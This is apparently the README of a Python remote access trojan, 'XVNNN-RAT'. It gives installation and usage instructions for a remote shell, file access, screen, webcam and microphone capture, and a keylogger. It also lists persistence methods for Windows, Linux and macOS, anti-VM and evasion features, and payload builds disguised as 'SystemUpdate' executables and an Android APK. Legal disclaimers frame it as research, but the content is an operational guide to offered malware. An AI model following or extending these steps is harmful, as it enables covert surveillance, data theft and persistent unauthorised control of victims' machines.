# XVNNN-RAT - Remote Access Tool

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.7%2B-blue" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-green" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-yellow" alt="License">
</p>

> **Author:** Ali Zafar  
> **Email:** alizafarbati@gmail.com  
> **Version:** 1.0.0  
> **GitHub:** https://github.com/AliZafar780/xvn-rat

---

## ⚠️ LEGAL NOTICE

**XVNNN-RAT is a Remote Access Tool designed exclusively for authorized security research, penetration testing, and educational purposes.**

- **Authorized Use:** Security testing with explicit written permission
- **Educational Use:** Learning about remote access tools and security
- **Prohibited:** Any unauthorized access to computer systems (illegal)

**By using this tool, you agree to:**
1. Only use it on systems you own or have explicit permission to test
2. Comply with all applicable laws and regulations
3. Accept full responsibility for your actions

**Misuse of this tool may result in criminal charges.**

---

## 🚀 Features

### Remote Access Capabilities
- **Remote Shell:** Execute commands on remote systems
- **File Management:** Upload, download, and browse files
- **Screen Capture:** Take screenshots remotely
- **Webcam Access:** Capture from webcam (optional)
- **Audio Recording:** Record microphone audio (optional)
- **Process Management:** View and manage running processes
- **Network Scanning:** Scan local network for devices

### Persistence Mechanisms (Research Purposes)
- **Windows:** Registry, scheduled tasks, services
- **Linux:** Cron jobs, systemd services
- **macOS:** Login items
- **Note:** These are for research/educational purposes only

### Security Features
- **Anti-VM Detection:** For testing in virtualized environments
- **Code Obfuscation:** Educational demonstration only
- **Evasion Techniques:** For security research

---

## 📦 Installation

### Prerequisites

**Python 3.7+ required**

```bash
# Check Python version
python3 --version
```

### Step 1: Clone Repository

```bash
git clone https://github.com/AliZafar780/xvn-rat.git
cd xvn-rat
```

### Step 2: Install Dependencies

**Option A: Automated Setup (Recommended)**
```bash
./setup.sh
```

**Option B: Manual Installation**
```bash
# Core dependencies
pip3 install pynput mss Pillow psutil --break-system-packages

# Optional dependencies (recommended)
pip3 install opencv-python pyaudio --break-system-packages

# For building executables
pip3 install pyinstaller --break-system-packages
```

**Option C: Using Virtual Environment (Recommended for security)**
```bash
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# or venv\Scripts\activate  # Windows

pip install pynput mss Pillow psutil opencv-python pyaudio
```

### Step 3: Verify Installation

```bash
python3 test_advanced.py
```

Expected output:
```
✓ Modules: PASS
✓ Generators: PASS
✓ Persistence: PASS
✓ Utilities: PASS
Total: 4/4 tests passed
```

---

## 🔧 Quick Start Guide

### Basic Usage - Terminal Mode

#### Step 1: Start Server (Terminal 1)
```bash
python3 src/server/headless.py
```

**Output:**
```
XVNNN-RAT v1.0.0 - Headless Server
Server started on 0.0.0.0:4444
Waiting for connections...
```

#### Step 2: Start Client (Terminal 2)
```bash
python3 src/client/main.py
```

**Output:**
```
XVNNN-RAT v1.0.0 Client connecting to 127.0.0.1:4444...
```

#### Step 3: Control from Server

**List connected clients:**
```
xvn> list
```

**Execute command on client 1:**
```
xvn> shell 1
shell@1> whoami
shell@1> ls -la
shell@1> exit
```

**Browse files on client 1:**
```
xvn> files 1
```

**Take screenshot:**
```
xvn> screen 1
```

**Get system information:**
```
xvn> info 1
```

---

## 📖 Command Reference

### Server Commands

| Command | Description | Example |
|---------|-------------|---------|
| `list` | List all connected clients | `xvn> list` |
| `shell <id>` | Open interactive shell | `xvn> shell 1` |
| `files <id>` | Browse files | `xvn> files 1` |
| `screen <id>` | Take screenshot | `xvn> screen 1` |
| `webcam <id>` | Capture webcam | `xvn> webcam 1` |
| `info <id>` | System information | `xvn> info 1` |
| `persist <id> <method>` | Add persistence | `xvn> persist 1 registry` |
| `stop` | Stop server | `xvn> stop` |
| `exit` | Exit server | `xvn> exit` |

### Persistence Methods

**Windows:**
- `registry` - Add to registry run keys
- `scheduled_task` - Create scheduled task
- `service` - Create Windows service
- `startup` - Add to startup folder
- `wmi` - WMI event subscription
- `all` - Try all methods

**Linux:**
- `cron` - Add to crontab
- `systemd` - Create systemd service
- `shell_profile` - Add to .bashrc/.zshrc
- `ld_preload` - Add to LD_PRELOAD
- `all` - Try all methods

**macOS:**
- `login_item` - Add to login items

---

## 🔧 Payload Generation

### Generate Payloads

```bash
python3 generate.py
```

**Available Options:**
1. Windows Python Payload
2. Linux Python Payload
3. Shell Script Payload
4. Generate All Payloads
5. Android APK Project
6. Exit

### Building Executables

**Windows:**
```bash
# Build with PyInstaller
pyinstaller --onefile --noconsole --name "SystemUpdate" src/client/main.py
```

**Linux:**
```bash
pyinstaller --onefile --name "system-update" src/client/main.py
```

**Android APK:**
```bash
# Generate APK project
python3 generate.py
# Select option 5 (Android APK)
# Build with Buildozer
cd apk_builds/SystemUpdate
buildozer android debug
```

---

## 📁 Project Structure

```
xvn-rat/
├── src/
│   ├── client/          # Client application
│   │   └── main.py      # Main client
│   ├── server/          # Server applications
│   │   ├── main.py      # GUI server
│   │   └── headless.py  # CLI server
│   ├── modules/         # Feature modules
│   │   ├── shell.py     # Remote shell
│   │   ├── filemanager.py  # File operations
│   │   ├── screen.py    # Screenshot
│   │   ├── webcam.py    # Webcam capture
│   │   ├── audio.py     # Audio recording
│   │   ├── systeminfo.py  # System info
│   │   ├── keylogger.py # Keylogger
│   │   ├── process.py   # Process management
│   │   ├── network.py   # Network tools
│   │   └── persistence.py  # Persistence
│   ├── utils/           # Utility functions
│   │   ├── network.py   # Network utilities
│   │   ├── system.py    # System utilities
│   │   └── security.py  # Security utilities
│   └── generator/       # Payload generators
│       ├── apk_generator.py
│       └── payload_generator.py
├── docs/                # Documentation
├── generate.py          # Payload generation tool
├── setup.sh             # Setup script
├── test_advanced.py     # Test suite
└── README.md            # This file
```

---

## 🧪 Testing

### Run Test Suite

```bash
python3 test_advanced.py
```

### Manual Testing

1. Start server in one terminal
2. Start client in another terminal
3. Test commands:
   - `list` - Verify client appears
   - `shell 1` - Test remote command execution
   - `files 1` - Test file browsing
   - `info 1` - Test system info gathering

---

## 🔒 Security Considerations

### Best Practices for Authorized Testing

1. **Obtain Permission:** Always get written authorization
2. **Use Isolated Environment:** Test in controlled lab environment
3. **Document Activities:** Keep detailed logs of testing activities
4. **Secure Communication:** Use encrypted channels for real testing
5. **Clean Up:** Remove all installed components after testing

### Network Security

- Default port: 4444 (change for production)
- No encryption by default (educational purposes)
- Consider TLS/SSL for real-world deployments

### Authentication

- No authentication in default configuration
- Add authentication before production use
- Consider certificate-based authentication

---

## 📚 Documentation

- **README.md** - This file (installation & quick start)
- **docs/INSTALLATION.md** - Detailed installation guide

---

## 🛠️ Troubleshooting

### Common Issues

**Issue: "Module not found" errors**
```bash
# Install missing dependencies
pip3 install pynput mss Pillow psutil --break-system-packages
```

**Issue: Webcam not working**
```bash
# Install OpenCV
pip3 install opencv-python --break-system-packages
```

**Issue: Audio not working**
```bash
# Install PyAudio
pip3 install pyaudio --break-system-packages
```

**Issue: Connection refused**
- Check if server is running
- Verify firewall allows port 4444
- Try different port if needed

**Issue: Permission denied on Linux**
- Some features may require sudo
- Try running with elevated privileges for testing

---

## 📊 Performance

### System Requirements
- **Minimum:** Python 3.7+, 2GB RAM
- **Recommended:** Python 3.9+, 4GB RAM
- **Optimal:** Python 3.11+, 8GB RAM

### Resource Usage
- **CPU:** Low during idle, moderate during file operations
- **Memory:** ~50MB client, ~100MB server
- **Network:** Minimal bandwidth usage

---

## 📝 License

MIT License

Copyright (c) 2024 Ali Zafar (alizafarbati@gmail.com)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

## 📞 Support & Contact

For questions or issues:
- **Author:** Ali Zafar
- **Email:** alizafarbati@gmail.com
- **Repository:** https://github.com/AliZafar780/xvn-rat

---

## 🎯 Disclaimer

**XVNNN-RAT is for educational and authorized security research purposes only.**

The author assumes no liability for misuse of this tool. Users are responsible for complying with all applicable laws and regulations.

**By using this tool, you agree to:**
1. Only use on systems you own or have explicit permission to test
2. Accept full responsibility for your actions
3. Comply with all applicable laws

---

**Happy Hacking! 🎉**

*Remember: Always obtain proper authorization before conducting security testing.*
